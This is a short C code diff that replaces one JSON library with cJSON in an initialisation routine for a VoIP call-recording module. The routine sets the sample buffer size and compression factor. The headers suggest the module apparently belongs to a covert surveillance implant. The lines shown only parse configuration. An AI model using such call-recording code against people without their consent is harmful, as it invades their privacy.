@@ -1,7 +1,8 @@
 #define _CRT_SECURE_NO_WARNINGS 1
 
 #include <Windows.h>
-#include <json/JSON.h>
+#include <cJSON/cJSON.h>
+#include <stdio.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/AM_Core.h"
 #include <rcs/bin_string.h>
@@ -854,12 +855,14 @@ DWORD WINAPI PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD WINAPI PM_VoipRecordInit(JSONObject elem)
+DWORD WINAPI PM_VoipRecordInit(cJSON *elem)
 {
+	cJSON* buffer = cJSON_GetObjectItem(elem, "buffer");
+	cJSON* compression = cJSON_GetObjectItem(elem, "compression");
 	// Inizializza la dimensione dei sample su disco
 	// e il fattore di compressione
-	max_sample_size = (DWORD)elem[L"buffer"]->AsNumber();
-	compress_factor = (DWORD)elem[L"compression"]->AsNumber();
+	max_sample_size = (DWORD)cJSON_GetNumberValue(buffer);
+	compress_factor = (DWORD)cJSON_GetNumberValue(compression);
 
 	// Riallochiamo l'array per i PCM
 	// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
